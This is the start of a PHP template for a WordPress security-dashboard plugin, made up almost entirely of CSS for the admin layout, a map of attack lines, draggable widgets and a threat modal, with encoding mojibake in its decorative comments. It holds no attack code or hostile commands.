<?php
/**
 * Security Dashboard Template
 * Pecodex Security ï¿½?" Cybersecurity dashboard rendered inside WordPress admin.
 * This file is include()'d by render_security_dashboard_page().
 * Assets (Leaflet, SortableJS, fonts) are enqueued in enqueue_security_dashboard_assets().
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}
?>
<style>
/* ï¿½"?ï¿½"? Base reset (scoped) ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
*, *::before, *::after { box-sizing: border-box; }

/* ï¿½"?ï¿½"? Material Symbols ï¿½?" force correct rendering inside WP admin ï¿½"?ï¿½"? */
#ps-shell .material-symbols-outlined {
  font-family: 'Material Symbols Outlined', sans-serif !important;
  font-weight: normal;
  font-style: normal;
  font-size: 20px;
  line-height: 1;
  letter-spacing: normal;
  text-transform: none;
  display: inline-block;
  white-space: nowrap;
  word-wrap: normal;
  direction: ltr;
  font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
  -webkit-font-feature-settings: 'liga';
  font-feature-settings: 'liga';
  -webkit-font-smoothing: antialiased;
}

/* ï¿½"?ï¿½"? Inter font for the shell ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#ps-shell, #threat-modal, #lockdown-overlay {
  font-family: 'Inter', system-ui, -apple-system, sans-serif;
}

/* Strip WP's own padding inside the content div */
#wpbody-content { padding-bottom: 0 !important; }
#pecodex-security-dashboard-wrap,
#pecodex-security-dashboard-wrap .wrap {
  margin: 0 !important;
  padding: 0 !important;
  max-width: none !important;
}

/* ï¿½"?ï¿½"? Layout ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
/* Fills the WP content area (after WP sidebar & admin bar) */
#ps-shell {
  display: flex;
  width: 100%;
  /* 32px = WP admin bar; adjust to 46px on mobile if needed */
  height: calc(100vh - 32px);
  overflow: hidden;
  background: #1a1a2e;
  font-family: 'Inter', system-ui, sans-serif;
}

/* ï¿½"?ï¿½"? Sidebar ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#ps-sidebar {
  width: 200px;
  min-width: 200px;
  background: #ffffff;
  display: flex;
  flex-direction: column;
  border-right: 1px solid #e5e7eb;
  z-index: 100;
  flex-shrink: 0;
  transition: width 0.28s cubic-bezier(.4,0,.2,1), min-width 0.28s;
  overflow: hidden;
  box-shadow: 2px 0 8px rgba(0,0,0,0.05);
}
#ps-sidebar.collapsed { width: 60px; min-width: 60px; }

.sidebar-brand {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 18px 14px 14px;
  border-bottom: 1px solid #f3f4f6;
}
.sidebar-avatar {
  width: 38px; height: 38px; border-radius: 50%;
  background: linear-gradient(135deg, #2d5a27, #4caf50);
  display: flex; align-items: center; justify-content: center;
  font-size: 11px; font-weight: 700; color: #fff;
  flex-shrink: 0;
  border: 2px solid rgba(76,175,80,0.35);
  box-shadow: 0 2px 8px rgba(76,175,80,0.25);
}
.sidebar-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
.sidebar-brand-text { overflow: hidden; white-space: nowrap; }
.sidebar-brand-text h2 { font-size: 13px; font-weight: 700; color: #111827; line-height: 1.2; }
.sidebar-brand-text p  { font-size: 10px; color: #9ca3af; margin-top: 2px; }

.sidebar-toggle {
  position: absolute;
  top: 14px; right: 12px;
  background: none; border: none; cursor: pointer;
  color: #9ca3af;
  font-size: 20px;
  display: flex; align-items: center;
  transition: color 0.15s;
  z-index: 10;
}
.sidebar-toggle:hover { color: #111827; }

.sidebar-nav { flex: 1; overflow-y: auto; padding: 10px 8px; }
.sidebar-nav ul { list-style: none; display: flex; flex-direction: column; gap: 2px; }
.sidebar-nav a {
  display: flex; align-items: center; gap: 10px;
  padding: 9px 10px;
  border-radius: 8px;
  font-size: 13px; font-weight: 500;
  color: #6b7280;
  text-decoration: none;
  transition: background 0.15s, color 0.15s;
  white-space: nowrap;
  overflow: hidden;
}
.sidebar-nav a:hover { background: #f9fafb; color: #111827; }
.sidebar-nav a.active {
  background: rgba(184,0,72,0.08);
  color: #b80048;
  border-right: 3px solid #b80048;
  margin-right: -8px;
  padding-right: 13px;
  font-weight: 600;
}
.sidebar-nav .material-symbols-outlined { font-size: 18px; flex-shrink: 0; }
.nav-label { transition: opacity 0.2s, width 0.2s; overflow: hidden; }

.sidebar-footer {
  padding: 10px 8px 14px;
  border-top: 1px solid #f3f4f6;
}
.btn-incident {
  width: 100%; margin-bottom: 8px;
  background: #b80048; color: #fff;
  border: none; border-radius: 8px;
  padding: 9px 12px;
  font-size: 12px; font-weight: 600;
  cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px;
  white-space: nowrap; overflow: hidden;
  transition: background 0.15s;
  box-shadow: 0 2px 6px rgba(184,0,72,0.25);
}
.btn-incident:hover { background: #9c003d; }
.sidebar-footer-links { display: flex; flex-direction: column; gap: 1px; }
.sidebar-footer-links a {
  display: flex; align-items: center; gap: 8px;
  padding: 6px 10px; border-radius: 6px;
  font-size: 11px; color: #9ca3af;
  text-decoration: none; white-space: nowrap; overflow: hidden;
  transition: color 0.15s, background 0.15s;
}
.sidebar-footer-links a:hover { color: #374151; background: #f9fafb; }
.sidebar-footer-links .material-symbols-outlined { font-size: 15px; flex-shrink: 0; }

/* ï¿½"?ï¿½"? Hardening Accordion ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
.ps-accordion-item {
  transition: background 0.3s ease;
}
.ps-accordion-item.active {
  background: rgba(255, 255, 255, 0.05);
}
.ps-accordion-item.active .ps-accordion-body {
  display: block !important;
}
.ps-accordion-item .fa-chevron-down {
  transition: transform 0.3s ease;
}
.ps-accordion-item.active .fa-chevron-down {
  transform: rotate(180deg);
}
.ps-sidenav-tab {
  transition: all 0.2s ease;
  border-left: 3px solid transparent;
}
.ps-sidenav-tab:hover {
  background: rgba(184, 0, 72, 0.04);
}
.ps-sidenav-tab.active {
  background: rgba(184, 0, 72, 0.08) !important;
  color: #b80048 !important;
  border-left: 3px solid #b80048 !important;
  font-weight: 600;
}

/* Hide text when collapsed */
#ps-sidebar.collapsed .nav-label,
#ps-sidebar.collapsed .sidebar-brand-text,
#ps-sidebar.collapsed .incident-label,
#ps-sidebar.collapsed .footer-label { display: none; }
#ps-sidebar.collapsed .sidebar-nav a { justify-content: center; }
#ps-sidebar.collapsed .btn-incident { padding: 9px; justify-content: center; }

/* ï¿½"?ï¿½"? Main area ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#ps-main {
  flex: 1;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  position: relative;
  min-height: 0;
}

/* ï¿½"?ï¿½"? Header bar ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#ps-header {
  height: 52px;
  background: rgba(255,255,255,0.97);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid rgba(0,0,0,0.08);
  display: flex;
  align-items: center;
  padding: 0 18px;
  gap: 14px;
  z-index: 50;
  flex-shrink: 0;
  box-shadow: 0 1px 4px rgba(0,0,0,0.06);
}
#ps-header h1 {
  font-size: 18px; font-weight: 700; color: #111;
  white-space: nowrap; margin-right: 6px;
}
.header-search {
  flex: 1; max-width: 340px;
  display: flex; align-items: center; gap: 6px;
  background: #f3f4f6; border: 1px solid #e5e7eb;
  border-radius: 8px; padding: 0 10px; height: 34px;
}
.header-search input {
  border: none; background: transparent; outline: none;
  font-size: 13px; color: #6b7280; width: 100%; font-family: inherit;
}
.header-search .material-symbols-outlined { font-size: 17px; color: #9ca3af; }

.widget-toggles {
  display: flex; align-items: center; gap: 4px; margin-left: 24px;
}
.widget-toggle {
  width: 32px; height: 32px; border-radius: 6px;
  border: 1px solid #e5e7eb; background: #fff; cursor: pointer;
  display: flex; align-items: center; justify-content: center;
  color: #9ca3af; transition: all 0.15s;
}
.widget-toggle:hover { border-color: #d1d5db; color: #4b5563; }
.widget-toggle.active {
  background: #b80048; border-color: #b80048; color: #fff;
}
.widget-toggle .material-symbols-outlined { font-size: 18px; }
.widget-hidden { display: none !important; }

.header-actions { display: flex; align-items: center; gap: 6px; margin-left: auto; }
.header-icon-btn {
  width: 34px; height: 34px; border-radius: 50%;
  border: none; background: transparent; cursor: pointer;
  display: flex; align-items: center; justify-content: center;
  color: #6b7280; transition: background 0.15s, color 0.15s;
}
.header-icon-btn:hover { background: #f3f4f6; color: #111; }
.header-icon-btn .material-symbols-outlined { font-size: 20px; }
.header-avatar {
  width: 32px; height: 32px; border-radius: 50%; overflow: hidden;
  cursor: pointer; border: 2px solid #e5e7eb;
}
.header-avatar img { width: 100%; height: 100%; object-fit: cover; }
.header-avatar img { width: 100%; height: 100%; object-fit: cover; }

/* ï¿½"?ï¿½"? Map container ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#ps-map-area {
  flex: 1;
  position: relative;
  overflow: hidden;
  min-height: 0;
}
#security-map {
  position: absolute;
  inset: 0;
  width: 100%;
  height: 100%;
  z-index: 0;
}
.leaflet-control-attribution { display: none !important; }

/* Styled zoom control to match dashboard */
.leaflet-control-zoom {
  border: none !important;
  border-radius: 10px !important;
  overflow: hidden;
  box-shadow: 0 4px 16px rgba(0,0,0,0.12) !important;
  margin-bottom: 16px !important;
  margin-right: 16px !important;
}
.leaflet-control-zoom a {
  background: rgba(255,255,255,0.95) !important;
  color: #374151 !important;
  border: none !important;
  border-bottom: 1px solid #f3f4f6 !important;
  width: 32px !important;
  height: 32px !important;
  line-height: 32px !important;
  font-size: 18px !important;
  font-weight: 400 !important;
  transition: background 0.15s, color 0.15s !important;
}
.leaflet-control-zoom a:hover {
  background: #b80048 !important;
  color: #fff !important;
}
.leaflet-control-zoom-out { border-bottom: none !important; }

/* ï¿½"?ï¿½"? SVG attack lines overlay ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#attack-svg {
  position: absolute;
  inset: 0;
  width: 100%;
  height: 100%;
  z-index: 5;
  pointer-events: none;
  transition: opacity 0.15s;
}
.attack-line {
  fill: none;
  stroke-linecap: round;
  pointer-events: stroke;
  cursor: pointer;
  transition: stroke-width 0.2s, filter 0.2s;
  opacity: 0.3;
}
.attack-line:hover { stroke-width: 5 !important; filter: drop-shadow(0 0 6px currentColor); opacity: 0.8; }
.attack-line.critical { stroke: #dc2626; stroke-width: 2.8; }
.attack-line.warning  { stroke: #f59e0b; stroke-width: 2.8; }
.attack-line.safe     { stroke: #22c55e; stroke-width: 2.8; }
.attack-line.info     { stroke: #3b82f6; stroke-width: 2.8; }

/* Flight Blip (plane) */
.flight-blip {
  pointer-events: none;
}

/* Pulse dots */
.pulse-dot-svg {
  animation: pulse-svg 1.8s ease-out infinite;
}
@keyframes pulse-svg {
  0%   { r: 4;   opacity: 0.9; }
  70%  { r: 10;  opacity: 0; }
  100% { r: 4;   opacity: 0; }
}

/* ï¿½"?ï¿½"? Widgets overlay (on map) ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#ps-widgets {
  position: absolute;
  inset: 12px;
  z-index: 10;
  pointer-events: none;
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  grid-template-rows: repeat(3, minmax(0, 1fr));
  gap: 12px;
}

/* ï¿½"?ï¿½"? Grid Cells ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
.grid-cell {
  position: relative;
  display: flex;
  flex-direction: column;
  gap: 10px;
  pointer-events: none; /* Let map clicks through! */
  border-radius: 12px;
  min-height: 120px;
  overflow: visible;
}

/* Alignment rules so widgets naturally stick to the corners */
#cell-0, #cell-3, #cell-6 { align-items: flex-start; } /* Left column */
#cell-1, #cell-4, #cell-7 { align-items: center; }     /* Middle column */
#cell-2, #cell-5, #cell-8 { align-items: flex-end; }   /* Right column */

#cell-0, #cell-1, #cell-2 { justify-content: flex-start; } /* Top row */
#cell-3, #cell-4, #cell-5 { justify-content: center; }     /* Middle row */
#cell-6, #cell-7, #cell-8 { justify-content: flex-end; }   /* Bottom row */

/* ï¿½"?ï¿½"? Container grid background (subtle) ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
.grid-cell::before {
  content: '';
  position: absolute;
  inset: -6px;
  background-image:
    linear-gradient(rgba(184,0,72,0.06) 1px, transparent 1px),
    linear-gradient(90deg, rgba(184,0,72,0.06) 1px, transparent 1px);
  background-size: 32px 32px;
  pointer-events: none;
  border-radius: 12px;
  opacity: 0;
  transition: opacity 0.2s ease;
  z-index: -1;
}
#ps-widgets.drag-active .grid-cell {
  pointer-events: auto; /* Allow dropping into empty cells */
}
#ps-widgets.drag-active .grid-cell::before {
  opacity: 1;
}

/* ï¿½"?ï¿½"? Maximize Widget ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
.widget-maximize {
  position: absolute; top: 8px; right: 32px;
  cursor: pointer; opacity: 0.4; transition: opacity 0.15s;
  font-size: 16px !important; color: #6b7280; border: none; background: transparent; padding: 0;
  line-height: 1; z-index: 10;
}
.glass-card:hover .widget-maximize { opacity: 0.85; }
.widget-maximize:hover { color: #111; }

.glass-card.maximized {
  position: fixed !important;
  top: 50% !important; left: 50% !important;
  transform: translate(-50%, -50%) !important;
  z-index: 9999 !important;
  margin: 0 !important;
  cursor: default !important;
  width: 900px !important;
  height: auto !important;
  max-width: 95vw !important;
  max-height: 90vh !important;
  overflow-y: auto !important;
  border-radius: 12px;
  box-shadow: 0 24px 80px rgba(0,0,0,0.3) !important;
}
.widget-settings-panel {
  display: none;
  margin-top: 20px;
  padding-top: 15px;
  border-top: 1px solid rgba(0,0,0,0.05);
}
.glass-card.maximized .widget-settings-panel {
  display: block;
}
#maximize-backdrop {
  position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 9998;
  backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
  display: none;
}
#maximize-backdrop.active { display: block; }

/* ï¿½"?ï¿½"? SortableJS ghost + chosen states ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
.glass-card.sortable-ghost {
  opacity: 1 !important;
  background: rgba(184,0,72,0.04) !important;
  border: 2px dashed rgba(184,0,72,0.4) !important;
  box-shadow: none !important;
  position: relative;
  overflow: hidden;
}
.glass-card.sortable-ghost * {
  visibility: hidden;
}
.glass-card.sortable-ghost::after {
  content: 'PUDOTA Tï¿½"Hï¿½"N';
  visibility: visible;
  position: absolute;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  font-weight: 600;
  color: rgba(184,0,72,0.5);
  font-size: 13px;
  letter-spacing: 0.05em;
  font-family: 'Inter', system-ui, sans-serif;
}
.glass-card.sortable-chosen {
  cursor: grabbing !important;
  box-shadow: 0 16px 48px rgba(0,0,0,0.22) !important;
  transform: scale(1.03) rotate(-0.5deg);
  z-index: 999 !important;
  transition: box-shadow 0.15s, transform 0.15s !important;
}
/* Widget drop animation */
@keyframes widget-drop {
  0%   { transform: scale(1.04) translateY(-6px); }
  60%  { transform: scale(0.98) translateY(2px); }
  100% { transform: scale(1)    translateY(0); }
}
.glass-card.just-dropped {
  animation: widget-drop 0.35s cubic-bezier(.22,.68,0,1.2) forwards;
}

/* ï¿½"?ï¿½"? Glass card ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
.glass-card {
  background: rgba(255,255,255,0.92);
  backdrop-filter: blur(16px);
  -webkit-backdrop-filter: blur(16px);
  border: 1px solid rgba(255,255,255,0.7);
  box-shadow: 0 4px 24px rgba(0,0,0,0.09);
  border-radius: 12px;
  pointer-events: auto;
  position: relative;
}
.drag-handle {
  position: absolute; top: 8px; right: 8px;
  cursor: grab; opacity: 0.4; transition: opacity 0.15s;
  font-size: 18px; color: #6b7280;
  line-height: 1;
  user-select: none;
}
.glass-card:hover .drag-handle { opacity: 0.85; }

/* System Resources */
.widget-resources { width: 240px; padding: 14px; }
.widget-resources h4 { font-size: 11px; font-weight: 600; color: #6b7280; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
.widget-resources h4 .material-symbols-outlined { font-size: 15px; color: #b80048; }
.res-row { margin-bottom: 8px; }
.res-row-head { display: flex; justify-content: space-between; font-size: 12px; font-weight: 500; color: #374151; margin-bottom: 4px; }
.res-bar { height: 5px; background: #e5e7eb; border-radius: 99px; overflow: hidden; }
.res-bar-fill { height: 100%; background: #b80048; border-radius: 99px; transition: width 0.6s; }

/* Traffic */
.widget-traffic { width: 160px; padding: 14px; }
.widget-traffic h4 { font-size: 11px; font-weight: 600; color: #6b7280; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
.widget-traffic h4 .material-symbols-outlined { font-size: 15px; color: #b80048; }
.traffic-val { font-size: 26px; font-weight: 700; color: #111; line-height: 1; }
.traffic-val span { font-size: 13px; font-weight: 500; color: #6b7280; }
.traffic-label { font-size: 10px; color: #9ca3af; margin-bottom: 8px; margin-top: 2px; }
.traffic-bars { display: flex; align-items: flex-end; gap: 3px; height: 32px; }
.traffic-bar { flex: 1; border-radius: 3px 3px 0 0; background: #b80048; opacity: 0.25; transition: opacity 0.2s; }
.traffic-bar.active { opacity: 1; }
.traffic-bar:hover { opacity: 0.8; }

/* Event log */
.widget-log { width: 500px; }
.widget-log-inner { padding: 0; overflow: hidden; display: flex; flex-direction: column; height: 220px; }
.log-header { padding: 12px 14px 10px 38px; border-bottom: 1px solid #f3f4f6; display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.6); }
.log-header h3 { font-size: 15px; font-weight: 700; color: #111; }
.badge-active { background: rgba(184,0,72,0.10); color: #b80048; font-size: 11px; font-weight: 600; padding: 3px 10px; border-radius: 99px; display: flex; align-items: center; gap: 5px; }
.badge-dot { width: 6px; height: 6px; border-radius: 50%; background: #b80048; animation: blink 1.2s ease infinite; }
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
.log-table-wrap { flex: 1; overflow-y: auto; }
.log-table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
.log-table thead th { padding: 7px 12px; font-size: 11px; font-weight: 600; color: #9ca3af; text-align: left; background: rgba(255,255,255,0.8); position: sticky; top: 0; z-index: 2; border-bottom: 1px solid #f3f4f6; }
.log-table tbody tr { border-bottom: 1px solid rgba(0,0,0,0.04); transition: background 0.1s; }
.log-table tbody tr:hover { background: rgba(0,0,0,0.025); }
.log-table td { padding: 7px 12px; color: #1f2937; }
.log-table .td-time { font-family: monospace; color: #9ca3af; font-size: 11px; }
.badge-status { font-size: 10.5px; font-weight: 600; padding: 2px 8px; border-radius: 99px; }
.badge-critical { background: rgba(220,38,38,0.12); color: #dc2626; }
.badge-blocked  { background: rgba(184,0,72,0.10);  color: #b80048; }
.badge-warning  { background: rgba(245,158,11,0.12); color: #b45309; }

/* Controls */
.widget-controls { width: 200px; }
.widget-controls-inner { padding: 14px; display: flex; flex-direction: column; height: 220px; }
.ctrl-header { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
.ctrl-header .material-symbols-outlined { font-size: 18px; color: #111; }
.ctrl-header h3 { font-size: 15px; font-weight: 700; color: #111; }
.ctrl-rows { display: flex; flex-direction: column; gap: 14px; flex: 1; }
.ctrl-row { display: flex; align-items: center; justify-content: space-between; }
.ctrl-label { font-size: 13px; font-weight: 600; color: #111; }

/* iOS-style toggle */
.toggle-wrap { position: relative; display: inline-flex; }
.toggle-wrap input { position: absolute; opacity: 0; width: 0; height: 0; }
.toggle-track {
  width: 42px; height: 24px; border-radius: 12px;
  background: #e5e7eb; cursor: pointer;
  transition: background 0.2s; position: relative; display: block;
}
.toggle-wrap input:checked + .toggle-track { background: #b80048; }
.toggle-thumb {
  position: absolute; top: 2px; left: 2px;
  width: 20px; height: 20px; border-radius: 50%;
  background: #fff; box-shadow: 0 1px 4px rgba(0,0,0,0.25);
  transition: transform 0.2s;
}
.toggle-wrap input:checked ~ .toggle-track .toggle-thumb { transform: translateX(18px); }

/* Lockdown button */
.ctrl-footer { margin-top: auto; padding-top: 12px; border-top: 1px solid #f3f4f6; }
.btn-lockdown {
  width: 100%; padding: 9px 14px;
  background: #fef2f2; border: 1px solid rgba(220,38,38,0.3);
  color: #991b1b; border-radius: 8px; cursor: pointer;
  font-size: 13px; font-weight: 600; font-family: inherit;
  display: flex; align-items: center; justify-content: center; gap: 6px;
  transition: background 0.15s, color 0.15s;
}
.btn-lockdown:hover { background: #dc2626; color: #fff; border-color: #dc2626; }
.btn-lockdown .material-symbols-outlined { font-size: 16px; }

/* ï¿½"?ï¿½"? Map pin labels ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
.leaflet-tooltip.map-label-tooltip {
  background: rgba(255,255,255,0.92);
  border: 1px solid rgba(0,0,0,0.1);
  border-radius: 6px;
  padding: 3px 8px;
  font-size: 11px;
  font-weight: 600;
  font-family: 'Inter', sans-serif;
  box-shadow: 0 2px 8px rgba(0,0,0,0.12);
  color: #111;
  pointer-events: none;
  white-space: nowrap;
}
.leaflet-tooltip.map-label-tooltip.critical { color: #dc2626; border-color: rgba(220,38,38,0.3); }
.leaflet-tooltip.map-label-tooltip.info { color: #3b82f6; border-color: rgba(59,130,246,0.3); }
.leaflet-tooltip.map-label-tooltip.hub { color: #1d4ed8; border-color: rgba(29,78,216,0.3); }
.leaflet-tooltip.map-label-tooltip::before { display: none; }

/* ï¿½"?ï¿½"? Threat modal ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#threat-modal-backdrop {
  position: fixed; inset: 0; z-index: 200;
  background: rgba(0,0,0,0.45);
  backdrop-filter: blur(4px);
  display: flex; align-items: center; justify-content: center;
  padding: 16px;
  opacity: 0; pointer-events: none;
  transition: opacity 0.25s;
}
#threat-modal-backdrop.open { opacity: 1; pointer-events: auto; }
#threat-modal {
  background: #fff; border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,0.2);
  width: 100%; max-width: 480px; padding: 24px;
  transform: scale(0.94);
  transition: transform 0.25s;
  position: relative;
}
#threat-modal-backdrop.open #threat-modal { transform: scale(1); }
.modal-close {
  position: absolute; top: 16px; right: 16px;
  background: none; border: none; cursor: pointer;
  color: #9ca3af; display: flex;
}
.modal-close:hover { color: #111; }
.modal-section {
  background: #f9fafb; border: 1px solid #e5e7eb;
  border-radius: 10px; padding: 12px 14px; margin-bottom: 10px;
}
.modal-section-title { font-size: 10px; font-weight: 700; color: #9ca3af; text-transform: uppercase; letter-spacing: .06em; margin-bottom: 8px; }
.modal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; font-size: 13px; }
.modal-grid span.lbl { color: #6b7280; }
.modal-grid span.val { font-weight: 600; color: #111; }
.modal-ip { color: #dc2626 !important; font-family: monospace; }
.modal-status-row {
  display: flex; justify-content: space-between; align-items: center;
  background: rgba(220,38,38,0.06); border: 1px solid rgba(220,38,38,0.15);
  border-radius: 8px; padding: 8px 12px; margin-bottom: 16px;
  font-size: 12px; font-weight: 600;
}
.modal-actions { display: flex; justify-content: flex-end; gap: 8px; }
